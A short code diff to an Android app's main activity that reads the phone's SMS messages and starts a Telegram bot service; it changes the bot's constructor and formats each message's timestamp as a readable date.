@@ -10,6 +10,10 @@ import android.widget.TextView;
 import androidx.appcompat.app.AppCompatActivity;
 import androidx.core.app.ActivityCompat;
 
+import java.sql.Timestamp;
+import java.util.Date;
+
+
 public class MainActivity extends AppCompatActivity {
 
     private TextView textView;
@@ -33,7 +37,7 @@ public class MainActivity extends AppCompatActivity {
         PhoneSmsService phoneSmsService = new PhoneSmsService(getContentResolver());
         smsService = new SmsService(phoneSmsService, smsFileService);
         RequestPermissions();
-        telegramBotService = new TelegramBotService(context);
+        telegramBotService = new TelegramBotService();
         telegramBotService.Init();
     }
 
@@ -60,10 +64,13 @@ public class MainActivity extends AppCompatActivity {
         String result = "";
         for(int i = 0; i < allSms.length;i ++){
             Sms sms = allSms[i];
+
+            Timestamp ts=new Timestamp(sms.TimeStamp);
+            Date date=new Date(ts.getTime());
+
             result += "From: " + sms.From + "\r\n" +
-                    "TimeStamp: " + sms.TimeStamp + "\r\n" +
-                    "Text: " + sms.Text + "\r\n" +
-                    "Id: " + sms.Id + "\r\n";
+                    "Date: " +  date     + "\r\n" +
+                    "Text: " + sms.Text + "\r\n";
         }
         return result;
     }
